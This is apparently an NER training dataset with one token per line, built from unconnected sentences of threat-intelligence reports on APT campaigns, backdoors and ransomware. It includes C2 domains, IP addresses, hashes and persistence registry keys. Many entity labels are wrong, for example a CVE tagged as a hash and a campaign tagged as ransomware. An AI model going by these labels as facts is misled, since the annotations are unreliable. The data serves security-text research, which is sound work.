source	O
.	O

Decoy	O
Document	O
Author	O
:	O
Decoy	O
Document	O
Last	O
Modified	O
:	O

Meanwhile	O
in	O
early-to-mid	O
2017	O
,	O
SPLM/CHOPSTICK/XAgent	B-malware.backdoor
detections	O
in	O
Central	O
Asia	O
provided	O
a	O
glimpse	O
into	O
ongoing	O
focus	O
on	O
ex-Soviet	O
republics	O
in	O
Central	O
Asia	O
.	O

wso	B-malware.backdoor
shell	O
–	O
error_log.php	O
wso	O
shell	O
–	O
error_log.php	O
Deobfuscated	O
wso	B-malware.backdoor
shell	O
–	O
error_log.php	O
Deobfuscated	O
wso	B-malware.backdoor
shell	O
–	O
error_log.php	O

We	O
have	O
analyzed	O
the	O
most	O
common	O
version	O
of	O
ZxShell	B-malware.backdoor
,	O
version	O
3.10	O
.	O

Tweet	O
.	O

A	O
global	O
Windows	O
hook	O
is	O
installed	O
into	O
the	O
Windows	O
event	O
chain	O
.	O

Products	O
like	O
Trend	O
MicroTM	O
Deep	O
DiscoveryTM	O
are	O
capable	O
of	O
mitigating	O
the	O
risks	O
from	O
these	O
threats	O
.	O

Webshell	B-malware.backdoor
Backdoor	O

Domain	O
names	O

During	O
our	O
research	O
,	O
we	O
noted	O
repeated	O
crawls	O
of	O
a	O
specialist	O
Canadian-Iranian	O
immigration	O
website	O
,	O
www.itc-canada[.]com	B-url.normal
,	O
using	O
Parsijoo	O
bot	O
from	O
CSRI	O
IP	O
ranges	O
.	O

i.e.	O
is	O
one	O
specific	O
IP	O
connecting	O
to	O
a	O
large	O
number	O
of	O
devices	O
using	O
the	O
same	O
credentials	O
in	O
a	O
short	O
period	O
of	O
time	O
;	O
•	O
Ensure	O
privileged	O
accounts	O
have	O
a	O
complex	O
password	O
that	O
does	O
not	O
include	O
any	O
part	O
of	O
the	O
username	O
,	O
or	O
application	O
it	O
relates	O
to	O
.	O

In	O
April	O
,	O
2018	O
,	O
the	O
Advanced	O
Threat	O
Response	O
Team	O
of	O
360	O
Core	O
Security	O
Division	O
takes	O
the	O
lead	O
in	O
capturing	O
the	O
group	O
's	O
new	O
APT	O
attack	O
using	O
0-day	O
vulnerabilities	O
(	O
CVE-2018-8174	B-malware.unknown
)	O
in	O
the	O
wild	O
,	O
and	O
then	O
discovers	O
the	O
new	O
type	O
attack	O
–	O
Office	O
related	O
attack	O
exploiting	O
0-day	O
VBScript	O
vulnerabilities	O
.	O

Figure	O
3	O
:	O
Gh0st	B-malware.backdoor
RAT	I-malware.backdoor
3.6	O
header	O
format	O

Also	O
in	O
2014	O
,	O
APT32	B-malware.infosteal
carried	O
out	O
an	O
intrusion	O
against	O
a	O
Western	O
country	O
's	O
national	O
legislature	O
.	O

Names	O
of	O
services	O
created	O
by	O
malware	O
:	O

High	O
.	O

United	O
States	O
Los	O
Angeles	O
Graeme	O
Tee	O
,	O
QuadraNet	O
192.161.48.59	B-ip.unknown
United	O
States	O
Los	O
Angeles	O
Graeme	O
Tee	O
,	O
QuadraNet	O
192.52.167.118	B-ip.unknown
United	O
States	O
Burns	O
Crowncloud	O
Us	O
Llc	O
,	O
Crowncloud	O
US	O
LLC	O
185.82.202.207	B-ip.unknown
Netherlands	O
Amsterdam	O
Host	O
Sailor	O
Ltd	O
.	O

Figure	O
23	O
:	O
mshta.exe	O
execution	O
code	O

Only	O
XML	O
wrappers	O
selecting	O
the	O
Flash	B-malware.backdoor
Player	I-malware.backdoor
ActiveX	I-malware.backdoor
control	O
and	O
an	O
OLE	O
Object	O
supplying	O
parameters	O
are	O
present	O
.	O

If	O
the	O
MAC	O
Address	O
starts	O
by	O
a	O
well-known	O
hexadecimal	O
number	O
,	O
the	O
system	O
is	O
identified	O
as	O
a	O
virtual	O
machine	O
.	O

It	O
then	O
creates	O
two	O
concurrent	O
threads	O
taking	O
the	O
created	O
object	O
as	O
its	O
parameter	O
.	O

These	O
domains	O
were	O
registered	O
to	O
the	O
registrant	O

At	O
the	O
moment	O
we	O
can	O
not	O
verify	O
that	O
it	O
originated	O
from	O
the	O
watering-hole	O
on	O
the	O
KNF	O
website	O
–	O
but	O
we	O
have	O
no	O
reason	O
to	O
doubt	O
this	O
either	O
.	O

Posted	O
on	O
:	O
February	O
13	O
,	O
2018	O
at	O
5:01	O
am	O
Posted	O
in	O
:	O
Targeted	O
Attacks	O

Attackers	O
targeting	O
Far	O
Eastern	O
International	O
Bank	O
(	O
FEIB	O
)	O
,	O
a	O
commercial	O
firm	O
in	O
Taiwan	O
,	O
moved	O
funds	O
from	O
its	O
accounts	O
to	O
multiple	O
overseas	O
beneficiaries	O
.	O

Exploit	O
:	O

Finally	O
,	O
the	O
C	O
&	O
C	O
communication	O
has	O
also	O
been	O
improved	O
in	O
the	O
recent	O
campaign	O
,	O
as	O
backup	O
domains	O
did	O
not	O
appear	O
in	O
the	O
old	O
ones	O
.	O

The	O
'	O
Count	O
'	O
parameter	O
counts	O
the	O
number	O
of	O
times	O
a	O
command	O
has	O
been	O
executed	O
,	O
'	O
­1	O
'	O
indicating	O
the	O
command	O
will	O
be	O
executed	O
only	O
once	O
.	O

The	O
scripts	O
are	O
available	O
at	O
https://github.com/fireeye/tools/tree/master/malware/Xtreme	B-url.normal
%	I-url.normal
20RAT	I-url.normal
.	O

For	O
the	O
purpose	O
of	O
this	O
article	O
we	O
will	O
dissect	O
the	O
RobototFontUpdate.exe	O
sample	O
and	O
show	O
how	O
it	O
manages	O
to	O
execute	O
its	O
malicious	O
payload	O
on	O
a	O
system	O
.	O

So	O
at	O
the	O
end	O
of	O
the	O
day	O
,	O
the	O
first	O
line	O
of	O
raw	O
encrypted	O
source	O
payload	O
from	O
the	O
C	O
&	O
C	O
is	O
pre-processed	O
from	O
the	O
12-character	O
ASCII	O
string	O

Exploits	B-malware.backdoor
,	O
Payloads	B-malware.backdoor
,	O
and	O
Decoy	B-malware.backdoor
Documents	I-malware.backdoor

The	O
of	O
the	O
newly	O
constructed	O
packet	O
matches	O
the	O
command	O
's	O
original	O
value	O
(	O
e.g.	O
responses	O
from	O
commands	O
will	O
reply	O
with	O
set	O
to	O
)	O
.	O

Figure	O
13	O
-	O
Hexidecimal	O
to	O
Signed	O
Integer	O
Conversion	O
The	O
DLL	O
can	O
accept	O
the	O
following	O
list	O
of	O
commands	O
from	O
its	O
C2	O
:	O
0x10	O
0x90	O
0x02	O
0x60	O
0xA0	O
0x04	O
0x70	O
0x80	O
Process	O
Execution	O
Reverse	O
Shell	O
File	O
Activity	O
(	O
delete	O
file	O
,	O
directory	O
browsing	O
,	O
etc	O
.	O
)	O

The	O
RC4	O
key	O
is	O
generated	O
as	O
an	O
MD5	O
hash	O
of	O
a	O
randomly	O
generated	O
117-bytes	O
buffer	O
.	O

This	O
tool	O
proxies	O
connections	O
through	O
intermediate	O
hops	O
and	O
aids	O
the	O
attackers	O
in	O
disguising	O
their	O
true	O
geographical	O
location	O
when	O
interacting	O
with	O
the	O
victim	O
networks	O
.	O

This	O
kind	O
of	O
security	O
research	O
has	O
the	O
potential	O
to	O
have	O
a	O
real	O
impact	O
on	O
vulnerable	O
people	O
.	O

This	O
blogpost	O
reveals	O
many	O
details	O
about	O
the	O
Diskcoder.C	O
(	O
aka	O
ExPetr	B-malware.unknown
,	O
PetrWrap	B-malware.ransom
,	O
Petya	B-malware.ransom
,	O
or	O
NotPetya	B-malware.ransom
)	O
outbreak	O
and	O
related	O
information	O
about	O
previously	O
unpublished	O
attacks	O
.	O

This	O
individual	O
also	O
used	O
a	O
specific	O
keyword	O
in	O
his	O
Skype	O
id	O
,	O
Twitter	O
id	O
,	O
and	O
the	O
YouTube	O
username	O
.	O

page	O
|	O
17	O

Figure	O
7	O
:	O
Main	O
connection	O
view	O
|	O
Connected	O
to	O

The	O
malware	O
is	O
spread	O
via	O
SMS	O
messages	O
and	O
emails	O
containing	O
malicious	O
links	O
.	O

ComServer4	O
:	O
hXXp://dneprorudnoe.info//...	O
[	O
]	O
...	O
/postal.php	O
STR	O

Like	O
the	O
Moafee	B-malware.infosteal
group	O
,	O
we	O
observed	O
the	O
DragonOK	B-malware.infosteal
group	O
running	O
an	O
HTRAN	O
proxy	O
client	O
on	O
one	O
of	O
their	O
front-end	O
command	O
and	O
control	O
servers	O
.	O

Please	O
see	O
an	O
analysis	O
of	O
the	O
backdoors	O
in	O
the	O
Attacker	O
's	O
Arsenal	O
section	O
.	O

is	O
executed	O
again	O
,	O
but	O
without	O
the	O
parameter	O
.	O

Dark	O
Seoul	O
did	O
not	O
use	O
any	O
0-days	O
.	O

Next	O
,	O
the	O
resulting	O
ASCII-string	O
is	O
fed	O
into	O
a	O
base64	O
decoding	O
function	O
,	O
producing	O
a	O
binary	O
string	O
.	O

Extensive	O
targeting	O
of	O
defense	O
ministries	O
and	O
other	O
military	O
victims	O
has	O
been	O
observed	O
,	O
the	O
profile	O
of	O
which	O
closely	O
mirrors	O
the	O
strategic	O
interests	O
of	O
the	O
Russian	O
government	O
,	O
and	O
may	O
indicate	O
affiliation	O
with	O
Главное	O
Разведывательное	O
Управление	O
(	O
Main	O
Intelligence	O
Department	O
)	O
or	O
GRU	O
,	O
Russia	O
's	O
premier	O
military	O
intelligence	O
service	O
.	O

Due	O
to	O
this	O
confusing	O
and	O
overloaded	O
terminology	O
,	O
we	O
refer	O
to	O
the	O
'	O
server	O
'	O
as	O
a	O
'	O
backdoor	O
'	O
on	O
the	O
victim	O
and	O
the	O
'	O
client	O
'	O
as	O
a	O
remote	O
'	O
controller	O
'	O
operated	O
by	O
the	O
attacker	O
.	O

HandlePP	O
:	O
:keyDecrypt	O
STRINGDATA	O
:	O
:BROWSER_SESSION_ID	O
(	O
m_pixel_ratio	O
)	O

In	O
this	O
technical	O
blog	O
post	O
we	O
are	O
going	O
to	O
take	O
a	O
look	O
at	O
the	O
malware	O
samples	O
found	O
during	O
the	O
research	O
.	O

svchost.exe	O

Public	O
Enemy	O
,	O
Black	O
Steel	O
and	O
the	O
Hour	O
of	O
Chaos	O
This	O
report	O
covers	O
a	O
campaign	O
of	O
phishing	O
and	O
malware	O
which	O
we	O
have	O
named	O
'	O
Operation	B-malware.ransom
Manul	I-malware.ransom
'	O
and	O
which	O
,	O
based	O
on	O
the	O
available	O
evidence	O
,	O
we	O
believe	O
is	O
likely	O
to	O
have	O
been	O
carried	O
out	O
on	O
behalf	O
of	O
the	O
government	O
of	O
Kazakhstan	O
against	O
journalists	O
,	O
dissidents	O
living	O
in	O
Europe	O
,	O
their	O
family	O
members	O
,	O
known	O
associates	O
,	O
and	O
their	O
lawyers	O
.	O

One	O
such	O
malware	O
that	O
was	O
deployed	O
via	O
this	O
possible	O
compromised	O
M.E.Doc	O
update	O
server	O
mechanism	O
was	O
the	O
VBS	B-malware.backdoor
backdoor	O
used	O
by	O
the	O
TeleBots	O
group	O
.	O

Special	O
thanks	O
to	O
several	O
anonymous	O
Syrians	O
who	O
brought	O
these	O
malware	O
samples	O
to	O
our	O
attention	O
.	O

Seems	O
like	O
the	O
Libyan	B-malware.infosteal
Scorpions	I-malware.infosteal
threat	O
actors	O
are	O
running	O
multiple	O
Android	O
RATs	O
since	O
numerous	O
ports	O
protected	O
by	O
SSL	O
layer	O
are	O
open	O
in	O
(	O
winmeif.myq-see.com	B-url.unknown
)	O
machine	O
.	O

The	O
hacked	O
web	O
server	O
hosting	O
the	O
exploit	O
kit	O
is	O
associated	O
with	O
the	O
ScarCruft	B-malware.infosteal
APT	I-malware.infosteal
and	O
used	O
in	O
another	O
line	O
of	O
attacks	O
.	O

In	O
the	O
second	O
wave	O
of	O
attack	O
,	O
a	O
spear-phishing	O
email	O
containing	O
a	O
different	O
malicious	O
excel	O
file	O
(	O
Contact	O
List	O
of	O
attendees.xls	O
)	O
was	O
sent	O
to	O
an	O
email	O
id	O
on	O
the	O
same	O
day	O
February	O
21st	O
,	O
2017	O
.	O

Between	O
April	O
30	O
,	O
2012	O

APT32	B-malware.infosteal
regularly	O
used	O
stealthy	O
techniques	O
to	O
blend	O
in	O
with	O
legitimate	O
user	O
activity	O
:	O
During	O
one	O
investigation	O
,	O
APT32	B-malware.infosteal
was	O
observed	O
using	O
a	O
privilege	O
escalation	O
exploit	O
(	O
CVE-2016-7255	B-hash
)	O
masquerading	O
as	O
a	O
Windows	O
hotfix	O
.	O

Once	O
the	O
all	O
the	O
files	O
are	O
deleted	O
the	O
malware	O
kills	O
its	O
own	O
process	O
as	O
shown	O
in	O
the	O
below	O
screen	O
shot	O
.	O

The	O
ubiquity	O
of	O
these	O
RATs	B-malware.backdoor
makes	O
it	O
difficult	O
to	O
determine	O
if	O
a	O
particular	O
security	O
incident	O
is	O
related	O
to	O
a	O
targeted	O
threat	O
,	O
cybercrime	O
or	O
just	O
a	O
novice	O
'	O
script	O
kiddie	O
'	O
causing	O
a	O
nuisance	O
.	O

Then	O
,	O
the	O
plain	O
executable	O
is	O
dropped	O
onto	O
disk	O
as	O
'	O
sqlsoldb.exe	O
'	O
and	O
run	O
,	O
and	O
then	O
moved	O
to	O
the	O
C	O
:	O
Windows	O
folder	O
with	O
the	O
file	O
name	O

2017년	O
10월	O
,	O
국내	O
최대	O
여행사가	O
해킹	O
당해	O
개인정보가	O
유출되었다	O
.	O

Bot	O
:	O

Word	O
document	O
contained	O
in	O
SFX	O
ZIP	O
file	O
B4F5BFC0AB0CC3D6B7A6B9653784DE56	B-hash
Found	O
in	O
Palestine	O

The	O
attackers	O
obviously	O
invested	O
significant	O
time	O
and	O
effort	O
in	O
keeping	O
the	O
operation	O
undetected	O
,	O
striving	O
to	O
evade	O
antivirus	O
detection	O
.	O

While	O
one	O
maintains	O
several	O
callback	O
c2	O
for	O
the	O
backdoor	O
to	O
fetch	O
more	O
instructions	O
and	O
upload	O
installed	O
software	O
and	O
file	O
paths	O
,	O
the	O
other	O
maintains	O
something	O
a	O
bit	O
more	O
unusual	O
.	O

The	O
malware	O
is	O
detected	O
as	O
BKDR_TRAVLAR	B-malware.backdoor
.	O

The	O
files	O
and	O
infrastructure	O
used	O
for	O
the	O
simulation	O
were	O
submitted	O
to	O
publicly	O
available	O
malware	O
analysis	O
services	O
.	O

Hypothesis	O
3	O
:	O
An	O
unidentified	O
third	O
party	O
unaffiliated	O
with	O
Tranchulas	O
developed	O
the	O
malware	O
,	O
deliberately	O
including	O
misleading	O
software	O
artifacts	O
as	O
a	O
direct	O
effort	O
to	O
create	O
speculation	O
and	O
shift	O
blame	O
toward	O
Tranchulas	O
.	O

Based	O
on	O
the	O
information	O
mentioned	O
above	O
,	O
It	O
looks	O
like	O
the	O
spoofed	O
email	O
was	O
sent	O
by	O
a	O
user	O
associated	O
with	O
a	O
Pakistan	O
based	O
company	O
Combined	O
Freight	O
(	O
PVT	O
)	O
Limited	O
.	O

A	O
200.63.46.23	B-ip.unknown
12	O
miamivicedvdboxset.com	B-url.unknown
.	O

安全中心	O

All	O
these	O
indicators	O
together	O
make	O
us	O
very	O
confident	O
that	O
Dino	B-malware.backdoor
was	O
developed	O
by	O
the	O
Animal	O
Farm	O
group	O
.	O

If	O
the	O
C2	O
response	O
contains	O
the	O
string	O
'	O
delete	O
'	O
,	O
then	O
the	O
malware	O
first	O
deletes	O
the	O
entry	O
from	O
the	O
Run	O
registry	O
that	O
the	O
malware	O
uses	O
for	O
persistence	O
as	O
shown	O
below	O
.	O

C	O
&	O
C	O
domain	O
name	O
resolution	O
We	O
are	O
unsure	O
how	O
the	O
document	O
is	O
being	O
distributed	O
;	O
however	O
,	O
taking	O
a	O
look	O
at	O
the	O
C	O
&	O
C	O
domain	O
name	O

Enumerate	O
drives	O
and	O
their	O
drive	O
types	O
File	O
listing	O
with	O
file	O
's	O
last	O
modification	O
date	O
,	O
file	O
attribute	O
and	O
file	O
size	O
Execute	O
downloaded	O
file	O
Set	O
file	O
pointer	O
of	O
specific	O
file	O
Close	O
file	O
handles	O
Load	O
.DLL	B-malware.backdoor
Create	O
directory	O
Delete	O
file	O
Delete	O
directory	O
tree	O
Get	O
file	O
time	O
stamps	O
of	O
a	O
specific	O
file	O
Either	O
runs	O
an	O
executable	O
,	O
loads	O
a	O
DLL	B-malware.backdoor
or	O
open	O
a	O
file	O
Move/Rename	O
a	O
file	O
Steal	O
login	O
credentials	O

On	O
21	O
December	O
2014	O
the	O
malicious	O
variant	O
of	O
the	O
Android	O
application	O
was	O
first	O
observed	O
in	O
limited	O
public	O
distribution	O
on	O
a	O
Russian	O
language	O
,	O
Ukrainian	O
military	O
forum	O
.	O

Interestingly	O
,	O
the	O
attack	O
included	O
targeting	O
of	O
at	O
least	O
one	O
non-public	O
address	O
associated	O
with	O
internal	O
opposition	O
communications	O
.	O

iop110112@hotmail.com	O
rsh1213@hotmail.com	O

[	O
ROOT_DRIVE	O
]	O
:	O
\Users\Administrator\AppData\Local\Allians\mcp\in\*	O
.	O

blog	O
bot	O
botnet	B-malware.ransom
bredolab	O
browser	O
brwoser	O
bug	O
carbon	O
caro	O
casino	O
cebit	O
cellphone	O
chat	O
cloud	O
cms	O
cobra	O
coding	O
conference	O
credit	O
card	O
cve	O
cyber	O
espionage	O
cyber	O
espionage	O
;	O
malware	O
cyper	O
espionage	O
.	O

This	O
actor	O
set	O
up	O
a	O
particularly	O
clever	O
site	O
to	O
deliver	O
trojanized	O
WinRAR	O
installers	O
in	O
the	O
summer	O
of	O
2016	O
,	O
appears	O
to	O
have	O
compromised	O
another	O
,	O
and	O
this	O
activity	O
reminds	O
us	O
somewhat	O
of	O
the	O
early	O
2014	O
Crouching	B-malware.drop
Yeti	I-malware.drop
activity	O
.	O

Evolution	O
of	O
earlier	O
plugin	O
used	O
in	O
2014	O
.	O

Many	O
sensitive	O
strings	O
are	O
not	O
encrypted	O
,	O
such	O
as	O
installation	O
paths	O
,	O
anti-virus	O
listings	O
,	O
insults	O
against	O
the	O
analysts	O
and	O
much	O
more	O
.	O

It	O
also	O
creates	O
a	O
shortcut	O
under	O
the	O
Startup	O
folder	O
in	O
the	O
Start	O
menu	O
:	O
•	O
Target	O
:	O
–L	O
Icon	O
:	O
(	O
This	O
uses	O
the	O
Internet	O
Explorer	O
icon	O
and	O
disguise	O
itself	O
as	O
part	O
of	O
Internet	O
Explorer	O
.	O
)	O

AMP	O
Threat	O
Grid	O
helps	O
identify	O
malicious	O
binaries	O
and	O
build	O
protection	O
into	O
all	O
Cisco	O
Security	O
products	O
.	O

In	O
this	O
analysis	O
,	O
we	O
observed	O
the	O
return	O
of	O
Hidden	B-malware.unknown
Cobra	I-malware.unknown
's	O
Bankshot	O
malware	O
implant	O
surfacing	O
in	O
the	O
Turkish	O
financial	O
system	O
.	O

Network	O
reconnaissance	O
to	O
find	O
vulnerable	O
software	O
.	O

This	O
means	O
each	O
infected	O
node	O
has	O
its	O
own	O
key	O
.	O

The	O
Cmstar	B-malware.unknown
sample	O
associated	O
with	O
the	O
MNKIT	O
delivery	O
document	O
creates	O
the	O
following	O
registry	O
key	O
to	O
automatically	O
execute	O
at	O
system	O
startup	O
:	O
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\xpsfiltsvcs	O
:	O
'	O
rundll32.exe	O
C	O
:	O
\DOCUME~1\ADMINI~1\LOCALS~1\Temp\xpsfiltsvcs.dll,XpsRegisterServer	O
'	O
Unit	O
42	O
found	O
an	O
additional	O
encrypted	O
registry	O
key	O
that	O
would	O
allow	O
Cmstar	B-malware.unknown
to	O
automatically	O
start	O
up	O
after	O
reboots	O
.	O

Jeff	O
Edwards	O
,	O
Research	O
Analyst	O
,	O
Arbor	O
Networks	O
ASERT	O
In	O
this	O
article	O
,	O
we	O
will	O
continue	O
our	O
series	O
on	O
reversing	O
DDoS	O
malware	O
crypto	O
systems	O
.	O

Inception	B-malware.backdoor
strings	O
chains	O
of	O
these	O
routers	O
together	O
to	O
create	O
multiple	O
proxies	O
to	O
hide	O
behind	O
.	O

try	O
to	O
run	O
a	O
targeted	O
executable	O
and	O
then	O
checks	O
for	O
the	O
existence	O
of	O
Runb	O
that	O
file	O
every	O
second	O
for	O
the	O
next	O
15	O
minutes	O
as	O
long	O
as	O
it	O
exists	O
netui3.dll	B-malware.backdoor
(	O
setup35.exe	B-malware.backdoor
)	O
Rune	O
try	O
to	O
run	O
a	O
targeted	O
executable	O
one	O
time	O
generates	O
a	O
targeted	O
file	O
listing	O
,	O
e.g.	O
,	O
dir	O
,	O
then	O
copies	O
the	O
files	O
in	O
the	O
list	O
one	O
by	O
one	O
copies	O
files	O
in	O
a	O
list	O
one	O
by	O
one	O
uses	O
NetUseAdd	O
to	O
connect	O
to	O
ipc	O
$	O
share	O
of	O
a	O
target	O
host	O
,	O
creates	O
a	O
listing	O
of	O
files	O
in	O
the	O
c	O
$	O
-­‐	O
z	O
$	O
shares	O
of	O
the	O
target	O
host	O
,	O
copies	O
the	O
files	O
to	O
a	O
new	O
location	O
,	O
deletes	O
the	O
share	O
connection	O
added	O
Srmf	O
using	O
NetuseAdd	O
Note	O
:	O
rows	O
highlighted	O
in	O
grey	O
denote	O
a	O
best	O
guess	O
on	O
functionality	O
;	O
more	O
analysis	O
was	O
pending	O
at	O
the	O
time	O
of	O
this	O
report	O
This	O
advisory	O
is	O
based	O
on	O
preliminary	O
information	O
.	O

Videos	O
can	O
be	O
found	O
on	O
YouTube	O
demonstrating	O
its	O
functionality	O
.	O

The	O
functionality	O
allows	O
the	O
attacker	O
to	O
update	O
their	O
malware	O
components	O
.	O

However	O
,	O
in	O
our	O
samples	O
we	O
could	O
find	O
only	O
five	O
corresponding	O
modules	O
.	O

Technically	O
,	O
these	O
attacks	O
exploited	O
previously	O
discovered	O
vulnerabilities	O
via	O
document	O
files	O
delivered	O
by	O
email	O
in	O
order	O
to	O
plant	O
a	O
previously	O
unknown	O
backdoor	O
onto	O
victim	O
systems	O
.	O

Malware	O
has	O
the	O
capability	O
to	O
update	O
itself	O
this	O
is	O
done	O
by	O
making	O
a	O
request	O
to	O
updateproductdownload.php	O
,	O
if	O
C2	O
response	O
satisfies	O
the	O
condition	O
then	O
it	O
downloads	O
the	O
updated	O
executable	O
from	O
an	O
URL	O
.	O

Figure	O
23	O
.	O

For	O
the	O
purpose	O
of	O
managing	O
tasks	O
,	O
the	O
main	O
component	O
of	O
CozyDuke	B-malware.drop
implements	O
6	O
commands	O
that	O
the	O
C	O
&	O
C	O
server	O
can	O
specify	O
.	O

@	O
#	O
'	O
across	O
the	O
top	O
of	O
a	O
keyboard	O
is	O
similar	O
to	O
the	O
password	O
observed	O
in	O
some	O
of	O
our	O
Poison	O
Ivy	O
samples	O
.	O

As	O
you	O
can	O
see	O
from	O
the	O
figures	O
below	O
,	O
it	O
uses	O
process-related	O
documented	O
and	O
undocumented	O
APIs	O
to	O
retrieve	O
file	O
handles	O
from	O
the	O
mshta.exe	O
process	O
,	O
resolves	O
their	O
names	O
and	O
uses	O
filename	O
heuristics	O
to	O
check	O
if	O
it	O
is	O
a	O
response	O
file	O
or	O
not	O
.	O

A	O
banks	O
in	O
Dubai	O
and	O
Abu	O
Dhabi	O
,	O
United	O
Arab	O
Emirates.A	O
Lobbying	O
organizations	O
in	O
the	O
UK	O
.	O

In	O
March	O
2017	O
,	O
in	O
response	O
to	O
active	O
targeting	O
of	O
FireEye	O
clients	O
,	O
the	O
team	O
launched	O
a	O
Community	O
Protection	O
Event	O
(	O
CPE	O
)	O
–	O
a	O
coordinated	O
effort	O
between	O
Mandiant	O
incident	O
responders	O
,	O
FireEye	O
as	O
a	O
Service	O
(	O
FaaS	O
)	O
,	O
FireEye	O
iSight	O
Intelligence	O
,	O
and	O
FireEye	O
product	O
engineering	O
–	O
to	O
protect	O
all	O
clients	O
from	O
APT32	B-malware.infosteal
activity	O
.	O

While	O
we	O
can	O
not	O
assess	O
whether	O
this	O
level	O
of	O
activity	O
is	O
typical	O
or	O
not	O
,	O
monitoring	O
it	O
over	O
time	O
to	O
determine	O
changes	O
in	O
response	O
to	O
international	O
pressure	O
could	O
be	O
revealing	O
.	O

JPCERT	O
calls	O
this	O
backdoor	O
'	O
ChChes	B-malware.infosteal
'	O
for	O
cross-reference	O
.	O

041136252FFEF074B0DEBA167BD12B8977E276BAC90195B7112260AB31D	O
DB810	O
2807AB1A912FF0751D5B7C7584D3D38ACC5C46AFFE2F168EEAEE70358	O
DC90006	O
3065AD0932B1011E57961104EB96EEE241261CB26B9252B0770D053208	O
39915F	O
5259AD04BDEA3F41B3913AA09998DB49553CE529E29C868C48DF40D	O
5AA7157EA	O
624A196B935427A82E8060876480E30CE6867CB9604107A44F85E2DA	O
96A7A22E	O
9D1FDA875DE75DEA545D1FF84973B230412B8B4946D64FF900E9D22B	O
065F8DCC	O
B181F418F6C8C79F28B1E9179CAEFEB81BDF77315814F831AF0CF0C2507	O
860C4	O
D7A4ABA5FC2DEE270AE84EAC1DB98B7A352FB5F04FD07C3F9E69DE6	O
E58B4C745	O
F67469C82E948628761FDFD26177884384481BA4BDBC15A53E8DF92D3	O
F216648	O
FE2996BC0C47C0626F43395EEE445D12E7C024C1B0AA2358947B5F1D	O
839A5868	O

Appearing	O
in	O
the	O
strings	O
are	O
an	O
intriguing	O
reference	O
to	O
google.com.hk	O
using	O
the	O
Chinese	O
(	O
simplified	O
)	O
language	O
parameter	O
(	O
Figure	O
3	O
)	O
and	O
references	O
to	O
the	O
text	O
'	O
Chopper	O
'	O
(	O
Figure	O
4	O
)	O
.	O

06.03.2015	O
:	O
Casper	O
:	O
the	O
newest	O
member	O
of	O
the	O
cartoon	O
malware	O
family	O

For	O
the	O
sake	O
of	O
this	O
analysis	O
we	O
'll	O
take	O
the	O
Vietnamese	O
backdoor	O
as	O
an	O
example	O
;	O
the	O
one	O
found	O
in	O
the	O
Indian	O
attack	O
operates	O
in	O
the	O
exact	O
same	O
way	O
.	O

For	O
this	O
reason	O
we	O
decided	O
to	O
check	O
the	O
submitters	O
for	O
possible	O
links	O
and	O
intelligence	O
information	O
.	O

When	O
the	O
target	O
attempts	O
to	O
open	O
what	O
they	O
think	O
is	O
a	O
jpg	O
image	O
file	O
,	O
the	O
executable	O
code	O
runs	O
and	O
drops	O
a	O
jpg	O
image	O
to	O
disk	O
,	O
then	O
opens	O
it	O
with	O
mspaint.exe	O
in	O
the	O
background	O
.	O

Init	O
phase	O
of	O
Sample	O
B	O
.................................	O
5.2	O
Decrypt	O
and	O
setup	O
registry	O
keys	O
............................	O
evaluate	O
commands	O
(	O
extract	O
)	O
and	O
error	O
handling	O
..................	O
Internet	O
connect	O
....................................	O
5.5	O
Create	O
process	O
calls	O
...................................	O

Figure	O
1	O
.	O

It	O
uses	O
the	O
eval	O
function	O
to	O
execute	O
a	O
command	O
sent	O
via	O
HT	O
T	O
P	O
cookies	O
or	O
a	O
POST	O
request	O
:	O

During	O
its	O
execution	O
,	O
win32shell.bat	O
contacts	O
the	O
command	O
and	O
control	O
server	O
at	O
up.pzchao.com:864/install.asp	B-url.cncsvr
?	O

The	O
malware	O
accomplishes	O
this	O
through	O
querying	O
the	O
netsvc	O
group	O
value	O
data	O
located	O
in	O
the	O
svchost	O
group	O
registry	O
key	O
which	O
is	O
HKLM\SOFTWARE\Microsoft\Windows	O
NT\CurrentVersion\SvcHost	O
.	O

360	O
Helios	O
also	O
provides	O
threat	O
intelligence	O
assessment	O
and	O
response	O
solutions	O
for	O
enterprises	O
.	O

dllhosts.exe	O

err=	O
%	O
d\n	O
'	O
'	O
!	O
up	O
%	O
s	O
\n	O
e	O
:	O
%	O
d\n	O
'	O
'	O
Get	O
Dir_c1	O
error	O
!	O
'	O

Abuse	O
of	O
this	O
service	O
requires	O
no	O
custom	O
malware	O
to	O
be	O
injected	O
on	O
the	O
routers	O
and	O
can	O
be	O
used	O
at	O
scale	O
very	O
easily	O
.	O

However	O
,	O
Poseidon	B-malware.infosteal
's	O
practice	O
of	O
being	O
a	O
'	O
custom­tailored	O
malware	O
implants	O
boutique	O
'	O
kept	O
security	O
researchers	O
from	O
connecting	O
different	O
campaigns	O
under	O
the	O
umbrella	O
of	O
a	O
single	O
threat	O
actor	O
.	O

Visit	O
https://www.cert.org/resilience/rmm.html	B-url.normal
to	O
learn	O
more	O
about	O
the	O
CERT	O
Resilience	O
Management	O
Model	O
.	O

Subsequently	O
,	O
the	O
payload	O
enables	O
its	O
automatic	O
execution	O
upon	O
every	O
system	O
startup	O
by	O
adding	O
the	O
path	O
of	O
the	O
executable	O
in	O
the	O
'	O
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run	O
'	O
registry	O
key	O
.	O

ןכותה	O
ךלהמ	O
,	O
שדוחהו	O
.רתויב	O
חלצומה	O
ןכותה	O
ךלהמ	O
תא	O
שדוח	O
לכב	O
תורחוב	O
.לודגה	O
סקסה	O
רקס	O
סקרוד	O

This	O
implant	O
represents	O
further	O
advancements	O
in	O
FANCY	O
BEAR	O
's	O
development	O
of	O
mobile	O
malware	O
for	O
targeted	O
intrusions	O
and	O
extends	O
Russian	O
cyber	O
capabilities	O
to	O
the	O
front	O
lines	O
of	O
the	O
battlefield	O
.	O

If	O
the	O
ping	O
succeeds	O
then	O
it	O
determines	O
if	O
C2	O
server	O
is	O
alive	O
by	O
sending	O
an	O
HTTP	O
request	O
,	O
it	O
then	O
reads	O
the	O
content	O
from	O
the	O
C2	O
server	O
and	O
looks	O
for	O
a	O
specific	O
string	O
'	O
Connection	O
!	O
'	O
.	O

Coder	O
:	O
Used	O
for	O
base64	O
encoding/decoding	O
.	O

This	O
apparent	O
FinSpy	B-malware.backdoor
deployment	O
in	O
Vietnam	O
is	O
troubling	O
in	O
the	O
context	O
of	O
recent	O
threats	O
against	O
online	O
free	O
expression	O
and	O
activism	O
.	O

The	O
group	O
staged	O
a	O
number	O
of	O
ambitious	O
new	O
attacks	O
